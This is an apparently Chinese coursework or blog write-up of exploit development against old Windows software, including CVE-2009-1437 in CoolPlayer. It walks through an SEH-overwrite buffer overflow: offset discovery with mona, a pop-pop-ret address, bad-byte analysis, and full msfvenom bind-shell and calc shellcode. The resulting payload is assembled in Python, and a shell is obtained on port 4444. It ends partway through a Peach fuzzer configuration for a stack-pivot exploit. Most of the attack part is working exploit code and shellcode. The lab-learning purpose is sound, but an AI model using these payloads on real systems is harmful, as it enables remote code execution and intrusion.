<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222005044498.png" alt="image-20241222005044498"></p>
<h3 id="定位偏移-3"><a class="markdownIt-Anchor" href="#定位偏移-3">#</a> 定位偏移</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 300</span><br></pre></td></tr></tbody></table></figure>
<p>mona 工具创造一个 300 字节长的唯一字符串</p>
<p>生成的 <code>pattern.txt</code>  选择 ASCII 版本的字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></tbody></table></figure>
<p>赋值给 junk，再运行 poc 脚本</p>
<p>触发异常</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></tbody></table></figure>
<p>确定偏移量</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222005713849.png" alt="image-20241222005713849"></p>
<p>得到 offset=217</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk = <span class="string">"A"</span>*<span class="number">217</span> +<span class="string">"BBBB"</span> + <span class="string">"CCCC"</span> +<span class="string">"D"</span> *(<span class="number">300</span>-<span class="number">217</span>-<span class="number">4</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>修改 junk 的值如上，验证偏移是否正确</p>
<p>再运行 poc 脚本，程序报错</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222010245082.png" alt="image-20241222010245082"></p>
<p><code>view-SEH_chain</code>  查看此时 SEH 的值，发现 SEH 被覆盖为 43434343，NSEH 覆盖为 42424242，说明偏移没有问题</p>
<h3 id="寻找跳转指令-3"><a class="markdownIt-Anchor" href="#寻找跳转指令-3">#</a> 寻找跳转指令</h3>
<p>继续使用 mona 工具来寻找 pop pop ret 的指令地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></tbody></table></figure>
<p>取用这条地址为的  <code>0x10018315</code>  指令</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222010615655.png" alt="image-20241222010615655"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk = <span class="string">"A"</span>*<span class="number">217</span> +<span class="string">"\xEB\x08\x90\x90"</span> + <span class="string">"\x15\x83\x01\x10"</span> + <span class="string">"D"</span>*(<span class="number">300</span>-<span class="number">217</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>再修改 junk 值如上两段字节分别是 nseh（EB 跳转 08 字节到 shellcode 的首地址）和 seh（刚刚取用的地址）</p>
<p>重新运行，在 0x10018315 处下断点，触发漏洞，按 shift+F9 进入异常处理程序，在断 点下停下来，继续运行，果然进入布置的栈空间</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222121244011.png" alt="image-20241222121244011"></p>
<h3 id="坏字节分析-5"><a class="markdownIt-Anchor" href="#坏字节分析-5">#</a> 坏字节分析</h3>
<p>观察漏洞溢出后，SEH 下的缓冲区空间不够用，尝试扩大输入，修改 junk 的大小如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk = <span class="string">"A"</span>*<span class="number">217</span> +<span class="string">"BBBB"</span> + <span class="string">"CCCC"</span> +<span class="string">"D"</span> *(<span class="number">800</span>-<span class="number">217</span>-<span class="number">4</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>漏洞也被成功触发，分析此时 SEH 下的缓冲区空间大小为 0x238=568 个字节，已经足够了</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222012115219.png" alt="image-20241222012115219"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona ba -cpb "\x00"</span><br></pre></td></tr></tbody></table></figure>
<p>生成坏字节字符串</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">badchar = <span class="string">b""</span></span><br><span class="line">badchar += <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span></span><br><span class="line">badchar += <span class="string">b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line">badchar += <span class="string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span></span><br><span class="line">badchar += <span class="string">b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line">badchar += <span class="string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span></span><br><span class="line">badchar += <span class="string">b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line">badchar += <span class="string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span></span><br><span class="line">badchar += <span class="string">b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line">badchar += <span class="string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span></span><br><span class="line">badchar += <span class="string">b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line">badchar += <span class="string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span></span><br><span class="line">badchar += <span class="string">b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line">badchar += <span class="string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span></span><br><span class="line">badchar += <span class="string">b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line">badchar += <span class="string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span></span><br><span class="line">badchar += <span class="string">b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br></pre></td></tr></tbody></table></figure>
<p>赋值给 badchar，在修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk = <span class="string">b"A"</span>*<span class="number">217</span> + <span class="string">b"\xEB\x08\x90\x90"</span> + <span class="string">b"\x15\x83\x01\x10"</span> + badchar + <span class="string">b"D"</span>*(<span class="number">800</span>-<span class="number">217</span>-<span class="number">8</span>-<span class="built_in">len</span>(badchar))</span><br></pre></td></tr></tbody></table></figure>
<p>分析得到坏字节为 <code>"\x25\x2B"</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222122335119.png" alt="image-20241222122335119"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona cmp -f C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a 04596E39</span><br></pre></td></tr></tbody></table></figure>
<p>如上 mona 命令也能得到坏字节</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222122751429.png" alt="image-20241222122751429"></p>
<h3 id="编写shellcode-7"><a class="markdownIt-Anchor" href="#编写shellcode-7">#</a> 编写 shellcode</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp EXITfunc=thread -b "\x00\x25\x2b" -f python </span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xdd\xc3\xd9\x74\x24\xf4\xbd\xeb\x9e\x36\x6a\x58"</span></span><br><span class="line">buf += <span class="string">"\x33\xc9\xb1\x53\x83\xc0\x04\x31\x68\x13\x03\x83"</span></span><br><span class="line">buf += <span class="string">"\x8d\xd4\x9f\xaf\x5a\x9a\x60\x4f\x9b\xfb\xe9\xaa"</span></span><br><span class="line">buf += <span class="string">"\xaa\x3b\x8d\xbf\x9d\x8b\xc5\xed\x11\x67\x8b\x05"</span></span><br><span class="line">buf += <span class="string">"\xa1\x05\x04\x2a\x02\xa3\x72\x05\x93\x98\x47\x04"</span></span><br><span class="line">buf += <span class="string">"\x17\xe3\x9b\xe6\x26\x2c\xee\xe7\x6f\x51\x03\xb5"</span></span><br><span class="line">buf += <span class="string">"\x38\x1d\xb6\x29\x4c\x6b\x0b\xc2\x1e\x7d\x0b\x37"</span></span><br><span class="line">buf += <span class="string">"\xd6\x7c\x3a\xe6\x6c\x27\x9c\x09\xa0\x53\x95\x11"</span></span><br><span class="line">buf += <span class="string">"\xa5\x5e\x6f\xaa\x1d\x14\x6e\x7a\x6c\xd5\xdd\x43"</span></span><br><span class="line">buf += <span class="string">"\x40\x24\x1f\x84\x67\xd7\x6a\xfc\x9b\x6a\x6d\x3b"</span></span><br><span class="line">buf += <span class="string">"\xe1\xb0\xf8\xdf\x41\x32\x5a\x3b\x73\x97\x3d\xc8"</span></span><br><span class="line">buf += <span class="string">"\x7f\x5c\x49\x96\x63\x63\x9e\xad\x98\xe8\x21\x61"</span></span><br><span class="line">buf += <span class="string">"\x29\xaa\x05\xa5\x71\x68\x27\xfc\xdf\xdf\x58\x1e"</span></span><br><span class="line">buf += <span class="string">"\x80\x80\xfc\x55\x2d\xd4\x8c\x34\x3a\x19\xbd\xc6"</span></span><br><span class="line">buf += <span class="string">"\xba\x35\xb6\xb5\x88\x9a\x6c\x51\xa1\x53\xab\xa6"</span></span><br><span class="line">buf += <span class="string">"\xc6\x49\x0b\x38\x39\x72\x6c\x11\xfe\x26\x3c\x09"</span></span><br><span class="line">buf += <span class="string">"\xd7\x46\xd7\xc9\xd8\x92\x42\xc1\x7f\x4d\x71\x2c"</span></span><br><span class="line">buf += <span class="string">"\x3f\x3d\x35\x9e\xa8\x57\xba\xc1\xc9\x57\x10\x6a"</span></span><br><span class="line">buf += <span class="string">"\x61\xaa\x9b\x85\x2e\x23\x7d\xcf\xde\x65\xd5\x67"</span></span><br><span class="line">buf += <span class="string">"\x1d\x52\xee\x10\x5e\xb0\x46\xb6\x17\xd2\x51\xb9"</span></span><br><span class="line">buf += <span class="string">"\xa7\xf0\xf5\x2d\x2c\x17\xc2\x4c\x33\x32\x62\x19"</span></span><br><span class="line">buf += <span class="string">"\xa4\xc8\xe3\x68\x54\xcc\x29\x1a\xf5\x5f\xb6\xda"</span></span><br><span class="line">buf += <span class="string">"\x70\x7c\x61\x8d\xd5\xb2\x78\x5b\xc8\xed\xd2\x79"</span></span><br><span class="line">buf += <span class="string">"\x11\x6b\x1c\x39\xce\x48\xa3\xc0\x83\xf5\x87\xd2"</span></span><br><span class="line">buf += <span class="string">"\x5d\xf5\x83\x86\x31\xa0\x5d\x70\xf4\x1a\x2c\x2a"</span></span><br><span class="line">buf += <span class="string">"\xae\xf1\xe6\xba\x37\x3a\x39\xbc\x37\x17\xcf\x20"</span></span><br><span class="line">buf += <span class="string">"\x89\xce\x96\x5f\x26\x87\x1e\x18\x5a\x37\xe0\xf3"</span></span><br><span class="line">buf += <span class="string">"\xde\x57\x03\xd1\x2a\xf0\x9a\xb0\x96\x9d\x1c\x6f"</span></span><br><span class="line">buf += <span class="string">"\xd4\x9b\x9e\x85\xa5\x5f\xbe\xec\xa0\x24\x78\x1d"</span></span><br><span class="line">buf += <span class="string">"\xd9\x35\xed\x21\x4e\x35\x24"</span></span><br></pre></td></tr></tbody></table></figure>
<p>得到 shellcode 如上</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk = <span class="string">"A"</span>*<span class="number">217</span> +<span class="string">"\xEB\x08\x90\x90"</span> + <span class="string">"\x15\x83\x01\x10"</span> +<span class="string">"\x90"</span>*<span class="number">16</span>+ buf +<span class="string">"D"</span>*(<span class="number">800</span>-<span class="number">217</span>-<span class="number">4</span>-<span class="number">4</span>-<span class="number">16</span>-<span class="built_in">len</span>(buf))</span><br></pre></td></tr></tbody></table></figure>
<p>再修改 junk 赋值，运行 poc 脚本</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222131530037.png" alt="image-20241222131530037"></p>
<p>发现 4444 端口开放，kali nc 连接成功 getshell</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222131709677.png" alt="image-20241222131709677"></p>
<p>换成弹计算机的 shellcode 再试一次</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=calc.exe  -b "\x00\x25\x2b" -f python</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xdb\xcc\xba\x23\x18\x8e\xb2\xd9\x74\x24\xf4\x5b"</span></span><br><span class="line">buf += <span class="string">b"\x33\xc9\xb1\x31\x31\x53\x18\x03\x53\x18\x83\xc3"</span></span><br><span class="line">buf += <span class="string">b"\x27\xfa\x7b\x4e\xcf\x78\x83\xaf\x0f\x1d\x0d\x4a"</span></span><br><span class="line">buf += <span class="string">b"\x3e\x1d\x69\x1e\x10\xad\xf9\x72\x9c\x46\xaf\x66"</span></span><br><span class="line">buf += <span class="string">b"\x17\x2a\x78\x88\x90\x81\x5e\xa7\x21\xb9\xa3\xa6"</span></span><br><span class="line">buf += <span class="string">b"\xa1\xc0\xf7\x08\x98\x0a\x0a\x48\xdd\x77\xe7\x18"</span></span><br><span class="line">buf += <span class="string">b"\xb6\xfc\x5a\x8d\xb3\x49\x67\x26\x8f\x5c\xef\xdb"</span></span><br><span class="line">buf += <span class="string">b"\x47\x5e\xde\x4d\xdc\x39\xc0\x6c\x31\x32\x49\x77"</span></span><br><span class="line">buf += <span class="string">b"\x56\x7f\x03\x0c\xac\x0b\x92\xc4\xfd\xf4\x39\x29"</span></span><br><span class="line">buf += <span class="string">b"\x32\x07\x43\x6d\xf4\xf8\x36\x87\x07\x84\x40\x5c"</span></span><br><span class="line">buf += <span class="string">b"\x7a\x52\xc4\x47\xdc\x11\x7e\xac\xdd\xf6\x19\x27"</span></span><br><span class="line">buf += <span class="string">b"\xd1\xb3\x6e\x6f\xf5\x42\xa2\x1b\x01\xce\x45\xcc"</span></span><br><span class="line">buf += <span class="string">b"\x80\x94\x61\xc8\xc9\x4f\x0b\x49\xb7\x3e\x34\x89"</span></span><br><span class="line">buf += <span class="string">b"\x18\x9e\x90\xc1\xb4\xcb\xa8\x8b\xd2\x0a\x3e\xb6"</span></span><br><span class="line">buf += <span class="string">b"\x90\x0d\x40\xb9\x84\x65\x71\x32\x4b\xf1\x8e\x91"</span></span><br><span class="line">buf += <span class="string">b"\x28\x0d\xc5\xb8\x18\x86\x80\x28\x19\xcb\x32\x87"</span></span><br><span class="line">buf += <span class="string">b"\x5d\xf2\xb0\x22\x1d\x01\xa8\x46\x18\x4d\x6e\xba"</span></span><br><span class="line">buf += <span class="string">b"\x50\xde\x1b\xbc\xc7\xdf\x09\xdf\x86\x73\xd1\x0e"</span></span><br><span class="line">buf += <span class="string">b"\x2d\xf4\x70\x4f"</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241222123751504.png" alt="image-20241222123751504"></p>
<p>成功弹出计算机</p>
<h2 id="基于栈旋转的漏洞利用-针对cve-2009-1437"><a class="markdownIt-Anchor" href="#基于栈旋转的漏洞利用-针对cve-2009-1437">#</a> 基于栈旋转的漏洞利用 - 针对 CVE-2009-1437</h2>
<p>首先修改 <code>M3UFuzzer.xml</code>  内容如下</p>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">"http://peachfuzzer.com/2012/Peach"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"http://peachfuzzer.com/2012/Peach ../peach.xsd"</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">Example of the WindowsDebugger monitor.  This example will launch a  </span></span><br><span class="line"><span class="comment">program with an attached debugger and log stack traces on faults.  The </span></span><br><span class="line"><span class="comment">included example program will fault on test 47. </span></span><br><span class="line"><span class="comment">Syntax: </span></span><br><span class="line"><span class="comment">peach samples\Debugger.xml </span></span><br><span class="line"><span class="comment">Output: </span></span><br><span class="line"><span class="comment">You will see the tests scroll along.  Once test 47 has occured you can </span></span><br><span class="line"><span class="comment">check </span></span><br><span class="line"><span class="comment">the c:\peach\logfiles folder for a log of this test that will include </span></span><br><span class="line"><span class="comment">a Debugger.txt </span></span><br><span class="line"><span class="comment">faul output. </span></span><br><span class="line"><span class="comment"><span class="doctag">NOTE:</span> The crashing test can varry by version of Peach. </span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">  Authors: </span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   Michael Eddington (mike@dejavusecurity.com) </span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">  $Id$ </span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment"> --&gt;</span> </span><br><span class="line">  </span><br><span class="line"> <span class="comment">&lt;!-- Define our file format DDL --&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">"M3UFileFormat"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Block</span> <span class="attr">name</span>=<span class="string">"Files"</span> <span class="attr">minOccurs</span>=<span class="string">"1"</span> <span class="attr">maxOccurs</span>=<span class="string">"1024"</span> <span class="attr">mutable</span>=<span class="string">"false"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">String</span> <span class="attr">name</span>=<span class="string">"filename"</span> <span class="attr">value</span>=<span class="string">"AAA"</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">Block</span>&gt;</span> </span><br><span class="line">   </span><br><span class="line"> <span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span> </span><br><span class="line">  </span><br><span class="line"> <span class="comment">&lt;!-- Define a simple state machine that will write the file and  </span></span><br><span class="line"><span class="comment">  then launch a program using the FileWriter and DebuggerLaucher publishers --&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">name</span>=<span class="string">"State"</span> <span class="attr">initialState</span>=<span class="string">"Initial"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">State</span> <span class="attr">name</span>=<span class="string">"Initial"</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line">   <span class="comment">&lt;!-- Write out contents of file.  The publisher attribute matches  </span></span><br><span class="line"><span class="comment">   the name we provide for the publisher in the Test section. --&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">"output"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">ref</span>=<span class="string">"M3UFileFormat"</span> /&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">Data</span> <span class="attr">name</span>=<span class="string">"data"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">fileName</span>=<span class="string">"C:\Users\kuang'j\Desktop\cve\peach-3.1.124-win-x86-debug\peach-3.1.124-win-x86-debug\test.m3u"</span>&gt;</span><span class="tag">&lt;/<span class="name">Data</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">Action</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line">   <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">"close"</span>&gt;</span><span class="tag">&lt;/<span class="name">Action</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">"call"</span> <span class="attr">method</span>=<span class="string">"CoolPlayer"</span>&gt;</span><span class="tag">&lt;/<span class="name">Action</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line">   <span class="comment">&lt;!-- Close file --&gt;</span> </span><br><span class="line">   <span class="comment">&lt;!--Action type="close" --&gt;</span> </span><br><span class="line">    </span><br><span class="line">   <span class="comment">&lt;!-- Launch the file consumer --&gt;</span> </span><br><span class="line">   <span class="comment">&lt;!--Action type="call" method="ScoobySnacks" </span></span><br><span class="line"><span class="comment">publisher="Peach.Agent"--&gt;</span> </span><br><span class="line">    </span><br><span class="line">  